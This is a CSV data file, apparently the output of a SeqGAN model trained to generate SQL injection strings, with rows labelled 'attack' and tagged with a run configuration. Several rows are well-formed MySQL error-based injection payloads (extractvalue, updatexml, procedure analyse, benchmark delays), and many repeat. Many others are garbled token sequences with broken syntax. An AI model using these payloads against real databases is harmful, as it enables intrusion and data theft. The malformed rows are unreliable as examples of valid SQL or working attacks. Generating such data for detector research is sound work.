attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""x1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1558
attack,"1%'   )    )    AND AND AND when  (  (  0x2e,0x7171706a71,  (  5000000,m5  (  (  (  t  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  elt  (  el  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  benchmark  (  5000000,md5  (  (  1808,concat  (  (  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  (  2917  =  (  (  7982  =  (    (  (  0x5c,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1559
attack,"1%y bnnselect   (  5433  (  (  e  (  0x5c,0x7171706a71,  (  (  (  benchmark  (  (  50000000x5c,0x7171706a71,  (  select   (  elt  (  e  (  benchmark  (  (  0x2e,0x7171706a71,  (  select   (  case when   (  5777  (  (  5000000,md5  (  (  select   (  elt  (  elt  (  3393  =  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  1808  =  (  1808  =    (  1297,concat  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1560
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1561
attack,"1%"" or extractvalue  (  (  (  1724  (  (  0x2e,0x7171706a71,  (    (  (  (  benchmark  (  (  (  (  benchmark  (  (  (   (  5433  (  9627,concat  (  (  (  (  (  (  0x5c,  (  (  (  5000000(  (  (  (  (  =  (  (  =  (  (  (  (  (  3393=  (  (  t  (  3393,1   )    (  extractvalue  (  (  5000000,md5  (  21627636  )  (  (  0x2e,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1562
attack,"1%""   =  u 2162  15591 where extractvalue  (  (  (  1 or else 1354  (  (  el  (  (  (  7982  =  (  (  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  elt  (   SELECT dual  )  )   end  (  (  0x5c)   (  updatexml  (  (  (  1297,concat  (  (  1808  =  (  7982,1   (    extractvalue  (  (  3393,1   )    AND from d5  (  1759  (  (  0x5c,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1563
attack,"select   (  )   from d 0 0 from dual  )  )  )   end  (  (0   (  case 0 from   (  (  )  elt  (  6461  )  )   end  (  (  1808,md5  (  elt  (  0x5c,0x7171706a71(  (  benchmark  (  (  5000000(  (  0x5c,0x7171706a71,  (  (  select   (  5847  =  (  3393,1   from duan  el  (  1297  =  (  (  7982  =  (  5740  =  (  1 0 from (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1564
attack,"1%""   )    AND 'i'  =  1  (  caset  (  from extractvalue  (  (  (  9627,concat  (  0x2e,0x7171706a71,  (  (  (  (  (  benchmark  (  (  select   (  elt  (  3393  =  (  7982,  (  (  (  select   (  6804  =    (  0x2e,md5  (  6134  (  elt  (  1535  )  e  =  (  1 0 from d  (  3393,1   )    AND 'i'  =  1  =  (  9627,m,  (  (  9627",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1565
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1566
attack," AND 1812 0 from dual  )  e  =  5847  =  (  9627,concat  (  (  (  (  0x2e,0x7171706a71,0x7171706a71,  (  select   (  elt  a  )  =  3393,md5  (  3393  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  (  1808  )  select   (  elt  (  e  (  1808  =  1   (  extractvalue  (  9627,md5  (  (  0x5c,  (  select   (  elt  (  e  (  5000000(  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1567
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1568
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1569
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1570
attack,  #,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1571
attack,"1%""   where 1559  (  select   (  case and extractvalue  (  (   (  ual  el  )  1 p   )    )    (  extractvalue  (  (  1808,concat  (  ,concat  (  (  (  (  0x2e,0x7171706a71,m5  (  (  0x5c,0x7171706a71,  (  (  0x5c,0x717a767a71  (  (  select 57045704  (  (  (  (  0x2e,(  select   (  elt  (  elt  (  2917  =  (  3393,  (  (  (  benchmark  (  benchmark  (  (  (  e  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1572
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1573
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1574
attack,"1   )    (  case from updatexml  (  (  (  (  (  (  (  (  0x5c,0x7171706a71,  (1  =  (  (  1808,md5  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  benchmark  (  (  (  (  (  5000000,md5  (  (  2446  (  3393  (  (  1   (  extractvalue  (  (  (  (  (  (  (  (  (  3393,concat  (  (  =  (  3393,md5  =  (  1297,concat  (  0x2e,md5  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1575
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1576
attack,"1%' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'vpk' like 'kr""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1577
attack,"1%'   (  )   from (    5322  (  (  (  7636  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,md5  (  =  (  (  3393,1   from d5  (  (  elt  elt  (  1808  =  (    (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  5000000(  =  (  (  (  0x5c,0x7171706a71,  (  (  select   (  e  (  elt  (  7982  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1578
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1579
attack,"1%"" and extractvalue  (  (  (  (  (  3393  =  (  (  =  (  (  (  1297,concat  (  (  (  (  =  (  (  0x2e,m5  (  (  0x5c,0x7171706a71,  (  select   (  4568  =  (  3393  =  (  9788,concat  (  (  (  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  benchmark  (  benchmark  (  (  5000000,m(  (  (  (    (  (  select   (  elt   a  elt  (  2917  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1580
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ygn"" like ""gh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1581
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1582
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1583
attack," AND proce  (  4660  =  5322  (  (  (  1808  =  (  (  0x4b774c75   (  (  case when   (  (  el  (  (  0x5c,  (  (  benchmark  (  select   (  (  elt  (  elt  (  1808  =  65810x7171706a71,1  )updatexml  (  (  (  (  0x2e,0x7171706a71,  (  select   (  0x2e,0x7171706a71,  (  (  9255,md5  (  (  1297,  (  (  select   (  (  elt  (  e  (  e(  benchmark  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1584
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'AND%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1585
attack,"1%"" or updatexml  (  (  (  (  (  =  (  7982,concat  (  (  (  (  0x5c,  (  (  (  (  select   (   (  (  elt  elt  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  9788,1   (  * 1  (  (  z  (  extractvalue  (  (  3393,m5  (  0x5c,  (  (  benchmark  (  (  benchmark  (  (  (  benchmark  (  (  (  elt  (  0x5c,  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1586
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1587
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1588
attack,"1%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1589
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1590
attack,"1%%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'prb'  =  'ck'  =  'pnnUgznbl_namxyt""  =  ""--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1591
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1592
attack,"1%""  )   or extractvalue  (  (  (  (  (  (  (  1808,1   )    ual  1 or extractvalue  (  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  select   (  elt  (  elt  (  2917=  =  concat  (  0x5c,0x7171706a71,  (  select   (  (  elt  (  elt  e  (  0x5c,0x7171706a71,  (  (  5000000(  (  (  select   (  )   SELECT dual  )  )   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1593
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1594
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kbudgenanameddure analse   (  1812   (  (  case 0 0 fromSELECT dut  (  el anal  )  =  5423  (  1808,1   )    (  extractvalue  (  9627,concat  (  (  (  0x4b774c75   =  (  6560  )  (  (  5000000,md5(  0x2e,0x7171706a71,  (  benchmarkt  (  (0 0 from(  (  (  elt  (  0x5c)  )  (  (  (  case when   (  1354  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1595
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1596
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ymxw'  =  'lqthen 11%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""opphkppph",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1597
attack," AND or extractvalueextractvalueextractvalue  (  (  (  (  (  1808,concat  (  0x5c,0x7171706a71,  (  5000000,md5  (  0x2e,  (  (  5000000(  (  (  0x5c,  (  select   (   (  8375  (  (  0x5c,0x7171706a71,  (  select   (  e  (  7997  =  (  1151  (  1759  =  (  (  0x2e,md5  (  (  0x2e,  (  =  (  9627,md5  (  (  (  0x2e,0x7171706a71,  (  5000000(  (  0x5c,0x7171706a71,  (  2826   (  9393  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1598
attack,"1%'  =  'kpcroknallocedu   adedu   AND anal  )  )   end  (  (  5777  (  elt  (  1759  =  1759,md5  (  1297,concat  (  ,md5  (  1808,1  )  1 else a  ut4568  )  (  elt  (  1297  =  (  1808,1   (  1354  =  2162 in FROM gzmwwblyhlseytmonan5464  =  5322  =  (  (  (  0x2e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1599
attack,"1%'   and extractvalue  (  (  (  1297,concat  (  (  # dual  )  )  1297,  (  (  3393  =  9627,concat  (  (  (  (  0x5c,0x7171706a71,  (  select   (  2917)  )   (  (  1297,1   ,1  (  case extractvalue  (  (  1297,1   )    )     (  (  select   (  )  case when  (  0x2e,md5  (  3393  (  =  (  (  1808  (  (  0x2e,  (  (  benchmark  (  (  5000000,md5  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1600
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1601
attack,"pxj86661724 else cast  (  1 extractvalue  (  (  (  5000000,md5  (  extractvalue  (  (  select   (  elt  (  case when   (  (  elta  el  (  1808  =  3393,  (  benchmark  (   (  updatexml  (  (  6581  (  (  0x2e,0x7171706a71,  (  (  9627,1   )    (  extractvalue  (  9627,m,md5  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  benchmark  (  (  (  benchmark  (  (  (  1808,concat  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1602
attack,"1%""   )    )    AND 8083  =  4102  =  1 or extractvalue  (  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  9255,concat  (  (  (  0x2e,0x7171706a71,  (  (  t(  5000000,(  (  (  benchmark  (  (  (  benchmark  (  5000000(  (  (  (  0x5c,  (  benchmark  (  (   (  (  8862,  (  5000000(  (  0x2e,md5  (  select   (  3393,1   from dual  )   end  (  (  (  elt  l_  )",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1603
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1604
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1605
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1606
attack,1%ppA,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1607
attack,"1%""   )    AND 'i'  )  select   (  case 0 from d5   (  5198  (  (  elt  (  lt  (  case  =  (  1808,1   and updatexml  (  (  (  (  (  (  (  elt  (  0x2e,md5  (  (  0x5c,0x4b774c75   (  (  elt  (  7982  =  (  3393,1   from d5  (  elt  (   6581(  5883  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  benchmark  (  (  9627,1   )    u",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1608
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1609
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1610
attack,"1%""   )    AND 'i'  =  2162 and extractvalue  (  3393,md5(  9788  =  (  8421  (  case when   (  (  (  elt  (  1297  =  3393,  (  (  =  (  2917,1   )    (  select   (  case when   (  (  1724  =  (  7982,1   or else cast  (  (  1 a  (  (  elt  )  1808  =  (  7982  =  (  (  0x5c,  (  (  select   (  1297   (  2501  (  (  5000000(  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1611
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1612
attack,"1 and extractvalue  (  (  (  (    (  (  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  (  0x5c,0x7171706a71,  (  (  (  0x5c,  (  benchmark  (  (  benchmark  (  (  (  e  (  (  0x2e,0x7171706a71,  (  1759(  (  0x2e,0x7171706a71,  (  extractvalue  (  (  (  (  (  benchmark  (  5000000(  (  (  (  (  0x5c,  (  5000000(  (  (  (  select   (  elt  (  1808  =  (  0x2e,0x7171706a71,  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1613
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1614
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1615
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ' pnnINT1nagznjlgzq",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1616
attack,"1%""   )    (  extractvalue  (  (  (   then 6166 5847 5847  (  (  (  (  5000000(  (  ((  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  50000001808,(  =  (  (  0x5c,  (  (  (  select   (  9788,md5  (  (  7982  =  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  5000000,md5  (  (  select   (  (  elt  (  elt  (  (  0x5c,0x717a767a71  )  extractvalue  1802  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1617
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1618
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'y'  =  'gnem",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1619
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1620
attack,"1%""   )    )    (  (  select 0 from d 5406 0 0 from(  (  e  )  e  5198  el  (  0x4b774c75   end  ( 0 from ds   (  3393,  (  (  elt  (  3393  =  (  3393(  0x4b774c75   (  8860  =  (  (  7982  =  (  3393,1   (  extractvalue  (  9255,md5  (  (  9788  (  (  7982,1   )    (  extractvalue  (  (  (  9627,concat  (  select   (  3393,1   )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1621
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1622
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1623
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1624
attack,"select   (  case when   (  4415  (  (  0x5c,md5  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  (  select   (  elt  (  e  (  1297  =  (  1759(  (  1808  =  (  3393,md5  (  (  7982  =  (  (  7982  =  (  (  5000000(  (  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  0x5c,0x7171706a71,md5  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  select   (  0x2e)  )   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1625
attack,"1%""   )    3933  =  3933  4415 extractvalue  (  (  (  9627,concat  (  (  (  (  =  (  1759(  (  (  (  7982,1   )    (  extractvalue  (  3393,concat  (  (  (  (  0x5c,0x7171706a71,md5  (  0x2e,0x7171706a71,  (  5000000(  (  0x5c,  (  (  select   (  2518  (  1297  =  1808,1   )    (  extractvalue  (  (  9627,md5  (  (  (  0x2e,0x7171706a71,  (  benchmark0x7171706a71,  (  (  select   (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1626
attack,"1%""  )   and extractvalue  (  3221 or  (  (  (  (  1297=  (  1808,concat  (  (  (  (  9083  =  (  1297,md5  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  )  elt  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  el  (  7982  =  (  5603,md5  =  (  (  0x5c(  0x2e,0x52515a50   (  0 0 from d5  (  elt  elt  (  (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1627
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'yb""  =  ""e%",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1628
attack,"1 and updatexml  (  (  (  (  (  (  (  (  0x5c,(  (  5000000(  (  3393  (  (  (  0x5c,0x7171706a71,md5  (  select   (  1808,0x78   from dua  )   (  (  e  )  el  (  (  0x5c,  (  5000000(  (  1759  (  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  8768  =  (  benchmark  (   (  5433  (  (  8862,concat  (  (  0x5c,  (  =  5530  (  9627,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1629
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1630
attack,"1808,0x7171706a71(  (  (  benchmark  (  (  5000000(  (  (  (  (  (  3393  =  (  (  (  (  (  0x5c,  (  (  benchmark5704  (  (  (  select   (  elt  (  1297  =  3393,  (  (  (  5000000,0x7171706a71(  (  =  (  1297,1   )    AND 'i'  =  1 extractvalue  (  (  3393,1  )  (  7982,m5  (  (  extractvalue  (  (  1354_  (  3393,concat  (  (  (  (  0x5c,  (  =  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1631
attack,I'  =  'yn,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1632
attack,"1%%""   )    )    AND 'i'  =  5406  1559 or extractvalue  (  (  (  (  (  1759(   (  5433  (  (  3393,1   )    )     (  --",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1633
